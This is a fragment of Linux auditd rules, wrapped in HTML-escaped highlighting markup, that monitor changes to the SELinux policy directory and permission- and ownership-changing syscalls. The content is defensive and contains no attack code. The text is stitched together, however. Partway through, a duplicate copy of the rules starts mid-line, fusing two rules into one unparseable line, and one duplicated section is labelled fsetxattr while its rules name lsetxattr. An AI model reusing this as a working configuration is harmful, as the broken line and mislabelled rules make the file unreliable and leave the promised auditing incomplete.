&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/selinux/ &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; MAC-policy

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - chmod&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - chown&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fchmod&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchmod &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchmod &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fchmodat&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchmodat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchmodat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fchown&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchown &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchown &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fchownat&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchownat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchownat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fremovexattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fremovexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fremovexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fsetxattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fsetxattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fsetxattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - lchown&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; lchown &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; lchown &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - lremovexattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; lremovexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; lremovexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - lsetxattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; lsetxattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; lsetxattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - removexattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; removexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; removexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod-a always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchmodat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchmodat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fchown&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchown &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchown &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fchownat&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchownat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fchownat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fremovexattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fremovexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; fremovexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - fsetxattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; lsetxattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; lsetxattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - removexattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; removexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; removexattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Discretionary Access Controls - setxattr&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; setxattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; setxattr &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; perm_mod

